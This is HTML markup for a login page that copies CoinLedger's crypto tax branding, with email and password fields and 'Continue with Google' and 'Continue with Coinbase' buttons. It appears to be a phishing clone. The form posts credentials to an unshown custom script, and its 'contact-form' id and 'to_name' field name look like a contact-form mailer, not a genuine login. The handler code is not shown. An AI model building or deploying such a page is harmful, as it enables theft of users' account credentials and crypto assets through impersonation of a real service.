    <link rel="shortcut icon" type="image/x-icon" href="https://d392zik6ho62y0.cloudfront.net/images/coin-ledger-logo.png">
    <link rel="stylesheet" href="login.css">

<body>
    <div class="Login">
        <div class="log-page">
            <div class="logo">
                <img src="https://coinledger.io/cdn-cgi/image/format=auto/https://cdn.prod.website-files.com/614c99cf4f23708b27a37503/618aa638ad45e02bd3b77f6f_Logo.svg" alt="Coin Ledger Logo">
            </div>
            <div class="page">
                <div class="inner-page">
                    <div class="inner">
                        <div class="title">
                            <h1>Login</h1>
                        </div>
                        <div class="details">
                            <form id="contact-form" onsubmit="func(event)">
                                <label for="Input_Email">Email</label>
                                <input class="text-input" placeholder=" your@gmail.com"   type="email" id="Input_Email" name="to_name" required>

                                <label for="Input_Password">Password</label>
                                <input class="text-input" placeholder="Your password"type="password" id="Input_Password" name="password"  required >

                                <div class="log-in">
                                    <button type="submit" class="log">Login</button>
                                </div>
                            </form>
                        </div>

                        <div class="for">
                            <a href="#" class="forgot">Forgot Password?</a>
                            <p>OR</p>
                        </div>

                        <div class="but1">
                            <button class="button1">
                                <img id="img1" src="https://auth.coinledger.io/assets/common/Google.svg" alt="Google Logo">
                                Continue with Google
                            </button>
                        </div>

                        <div class="but2">
                            <button class="button2">
                                <img id="img2" src="https://auth.coinledger.io/assets/common/Coinbase.svg" alt="Coinbase Logo">
                                Continue with Coinbase
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
